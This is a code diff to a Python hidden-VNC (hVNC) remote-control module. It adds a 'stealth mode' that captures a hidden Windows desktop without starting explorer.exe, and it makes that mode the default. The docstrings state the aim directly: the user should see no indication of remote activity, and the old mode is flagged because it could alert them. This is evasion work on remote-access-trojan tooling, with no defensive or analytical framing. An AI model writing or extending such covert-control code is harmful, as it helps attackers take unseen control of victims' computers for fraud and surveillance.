@@ -1595,6 +1595,9 @@ class HVNCSession:
         
         Note: This starts capture immediately to allow WebRTC connection to establish.
         The capture thread will retry until desktop is ready, returning black frames initially.
+        
+        WARNING: This is NOT stealth mode. Explorer.exe will be visible in Task Manager
+        and may alert the user to remote activity.
         """
         result = self._desktop.start_shell()
         if result:
@@ -1604,6 +1607,38 @@ class HVNCSession:
             self._capture.start_capture()
             logger.info("Shell started and capture initialized")
         return result
+    
+    def start_capture_only(self) -> bool:
+        """Start capture WITHOUT shell (explorer.exe) for STEALTH MODE.
+        
+        This initializes the hidden desktop and starts capture without
+        starting explorer.exe. This is the recommended mode for stealth
+        operation where the user should not see any indication of activity.
+        
+        Applications can still be launched directly on the hidden desktop
+        via launch_application() or launch_browser().
+        
+        Returns:
+            True if capture started successfully
+        """
+        try:
+            # Initialize the hidden desktop GDI without explorer
+            old_desktop = user32.GetThreadDesktop(kernel32.GetCurrentThreadId())
+            if user32.SetThreadDesktop(self._desktop._handle):
+                # Force a DC creation to initialize GDI on this desktop
+                test_dc = user32.GetDC(None)
+                if test_dc:
+                    user32.ReleaseDC(None, test_dc)
+                # Switch back to original desktop
+                user32.SetThreadDesktop(old_desktop)
+            
+            # Start capture - it will return black frames until apps are launched
+            self._capture.start_capture()
+            logger.info("STEALTH MODE: Capture started without shell")
+            return True
+        except Exception as exc:
+            logger.error("Failed to start stealth capture: %s", exc)
+            return False
     
     def launch_application(
         self,
@@ -1769,7 +1804,7 @@ def create_hvnc_session(
     width: int = 1920,
     height: int = 1080,
     fps: int = 30,
-    start_shell: bool = True,
+    start_shell: bool = False,  # Changed to False for stealth mode
 ) -> HVNCSession:
     """Create and initialize an hVNC session.
     
@@ -1777,12 +1812,20 @@ def create_hvnc_session(
         width: Capture width
         height: Capture height
         fps: Target framerate
-        start_shell: Start explorer.exe automatically
+        start_shell: Start explorer.exe automatically (default False for stealth)
     
     Returns:
         Initialized HVNCSession
+        
+    Note:
+        For STEALTH MODE, explorer.exe is NOT started by default.
+        The hidden desktop is completely invisible to the user.
+        Applications can still be launched directly without explorer.
     """
     session = HVNCSession(width=width, height=height, fps=fps)
     if start_shell:
         session.start_shell()
+    else:
+        # Start capture without shell for stealth mode
+        session.start_capture_only()
     return session
